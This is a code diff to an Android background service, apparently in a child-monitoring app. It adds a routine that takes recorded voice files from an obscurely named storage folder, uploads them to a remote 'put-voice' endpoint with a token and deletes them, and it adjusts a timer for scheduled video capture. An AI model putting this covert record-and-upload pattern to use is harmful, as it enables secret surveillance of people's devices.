@@ -241,6 +241,7 @@ public class childService extends Service implements LocationListener,UploadStat
 
                 Log.e("cach343", "onReceive: ");
                 if (isNetworkAvailable()) {
+
                     try {
                         File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
                         if (file.exists()) {
@@ -263,6 +264,7 @@ public class childService extends Service implements LocationListener,UploadStat
                         Log.e("exeption343", e.toString() );
                         e.printStackTrace();
                     }
+                    uploadfirstvoicefile();
                     sendDataClass sendDataClass = new sendDataClass();
                     sendDataClass.send(getApplicationContext());
                     OptionDB optionDB = new OptionDB(childService.this);
@@ -275,6 +277,7 @@ public class childService extends Service implements LocationListener,UploadStat
                         }
                     }
 //                    /**/
+
 //
                     if (a == 1) {
                         a = 0;
@@ -407,7 +410,10 @@ public class childService extends Service implements LocationListener,UploadStat
                 String[] dating = timedb.gettime().split(",");
 //                Log.e("checkforeground", dating[1]+","+dating[2]+","+dating[3]+","+dating[4]+","+dating[5]);
 //                Log.e("checkforeground", calendar.get(Calendar.YEAR)+","+localDate.getMonthValue()+","+calendar.get(Calendar.DAY_OF_MONTH)+","+calendar.get(Calendar.HOUR_OF_DAY)+","+calendar.get(Calendar.MINUTE));
-                if ((dating[1] + "," + dating[2] + "," + dating[3] + "," + dating[4] + "," + dating[5]).equals((calendar.get(Calendar.YEAR) + "," + (String) DateFormat.format("MM",   date) + "," + calendar.get(Calendar.DAY_OF_MONTH) + "," + calendar.get(Calendar.HOUR_OF_DAY) + "," + calendar.get(Calendar.MINUTE)))) {
+                String as= String.valueOf(Integer.parseInt((String) DateFormat.format("MM",   date))-1);
+                Log.e("rttredfgf", (dating[1] + "," + dating[2] + "," + dating[3] + "," + dating[4] + "," + dating[5])+",,,"+(calendar.get(Calendar.YEAR) + "," + as + "," + calendar.get(Calendar.DAY_OF_MONTH) + "," + calendar.get(Calendar.HOUR_OF_DAY) + "," + calendar.get(Calendar.MINUTE)));
+                if ((dating[1] + "," + dating[2] + "," + dating[3] + "," + dating[4] + "," + dating[5]).equals((calendar.get(Calendar.YEAR) + "," + as + "," + calendar.get(Calendar.DAY_OF_MONTH) + "," + calendar.get(Calendar.HOUR_OF_DAY) + "," + calendar.get(Calendar.MINUTE)))) {
+                    Log.e("rttredfgf", "checkforeground: ");
                     OptionDB optionDB = new OptionDB(context);
                     Intent vidIntent;
                     if (dating[0].equals("video1") && optionDB.getjs().get(6).equals("video1")) {
@@ -1214,5 +1220,27 @@ public class childService extends Service implements LocationListener,UploadStat
         }
         }
     }
+    public void uploadfirstvoicefile(){
+        File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/45854455555/");
+        if (directory.exists()){
+            File[] fileses = directory.listFiles();
+            if (fileses.length>0){
+                String uploadId = UUID.randomUUID().toString();
+                try {
+                    new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-voice/")
+                            .addFileToUpload(fileses[0].getPath(), "voice") //Adding file
+                            .addParameter("token", getToken(getApplicationContext()))
+                            .addParameter("token1", "AllowVoice")//Adding text parameter to the request
+                            .setAutoDeleteFilesAfterSuccessfulUpload(true)
+                            .setMaxRetries(2)
 
+                            .startUpload(); //Starting the upload
+                } catch (FileNotFoundException e) {
+                    e.printStackTrace();
+                } catch (MalformedURLException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
 }
